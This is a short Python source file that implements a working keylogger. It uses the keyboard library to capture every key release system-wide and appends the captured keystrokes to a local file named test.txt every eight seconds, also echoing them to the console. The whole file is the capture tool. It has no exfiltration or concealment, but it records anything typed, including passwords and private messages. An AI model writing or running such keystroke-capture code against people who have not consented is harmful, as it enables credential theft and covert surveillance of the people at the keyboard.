import os
import keyboard
from datetime import datetime
from threading import Timer

SEND_REPORT_EVERY = 8

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""

        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if name == "space":
            name = " "
        
        elif name == "enter":
            name = "[ENTER]\n"

        elif name == "decimal":
            name = "."

        elif name == "backspace":
            name = "* BKSPC* "

        elif name == "shift":
            name = ""
        
        else:
            name.replace(" ", "_")
            name = f"{name.upper()}"
            print(name)

        self.log += str(name)


    def create_file(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
     #   end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.file_name = "test.txt"
        if  os.path.exists(self.file_name):
            print("File already exists")
        else:
          print("Creating new file... ")
          file = open(self.file_name,"w")
          file.write("We just created a new file!\n")
          file.write(f"Starting on : {start_dt_str}")
          file.close()
          
    
    def report_to_file(self):
        with open(f"{self.file_name}", "a") as f:
            #f.write(self.log)
            f.write("\n")
            print(self.log,file=f)
            print(f"Added to {self.file_name}")


    def report(self):

        if self.log:
            self.end_dt = datetime.now()
            self.report_to_file()
            print(f"[{self.file_name}] - {self.log}")

        
        self.log = ""

        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
    
    def start(self):
        self.start_dt = datetime.now()
        self.create_file()
        keyboard.on_release(callback=self.callback)
        self.report()

        print(f"{self.start_dt} - Started KeyLogger")

        keyboard.wait()
        print("KEYBOARD LOGGER ENDED!!!!!!!")
    


keylogger = Keylogger(interval=SEND_REPORT_EVERY)
keylogger.start()